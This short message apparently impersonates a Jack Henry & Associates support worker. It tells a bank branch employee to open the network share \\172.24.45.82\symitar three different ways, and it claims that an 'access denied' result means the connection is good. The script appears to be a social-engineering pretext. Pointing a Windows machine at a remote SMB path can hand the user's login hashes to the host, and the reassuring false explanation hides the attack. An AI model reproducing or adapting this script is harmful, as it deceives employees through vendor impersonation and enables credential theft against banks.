Hi xyz, my name is xyz with Jack Henry & associates. I've been working with xyz at the seaside branch trying to determine the source for connectivity issues with the Symitar system.

We are going to need you to run a quick test for us which should will only take a few moments 

1:::
click start button in bottom left corner

click run

type \\172.24.45.82\symitar
::::

2:::
open the windows explorer ( the yellow folder on the bottom bar )

type \\172.24.45.82\symitar into the address bar at the top and hit enter
::::

3:::
open internet explorer ( the yellow folder on the bottom bar )

type \\172.24.45.82\symitar into the address bar at the top and hit enter
::::

If you see access denied or can't access that means the symitar controller is denieing your request, which means communication between your PC and the core is good.

Thank you for your time.
